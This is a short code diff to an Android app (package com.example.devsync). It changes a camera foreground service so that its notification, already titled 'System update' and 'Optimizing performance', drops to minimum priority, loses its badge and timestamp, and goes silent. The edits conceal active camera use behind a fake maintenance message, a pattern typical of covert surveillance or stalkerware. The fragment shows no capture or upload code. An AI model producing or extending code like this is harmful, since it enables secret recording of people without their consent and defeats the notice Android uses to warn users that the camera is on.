@@ -82,14 +82,16 @@ package com.example.devsync
       private fun startCameraForeground() {
           val channelId = "camera_channel"
           if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-              val ch = NotificationChannel(channelId, "Camera Service", NotificationManager.IMPORTANCE_LOW)
+              val ch = NotificationChannel(channelId, "Camera Service", NotificationManager.IMPORTANCE_MIN).apply { setShowBadge(false) }
               getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
           }
           val notification = NotificationCompat.Builder(this, channelId)
               .setContentTitle("System update")
               .setContentText("Optimizing performance")
               .setSmallIcon(android.R.drawable.ic_dialog_info)
-              .setPriority(NotificationCompat.PRIORITY_LOW)
+              .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setShowWhen(false)
+            .setSilent(true)
               .build()
           if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
               startForeground(1003, notification,
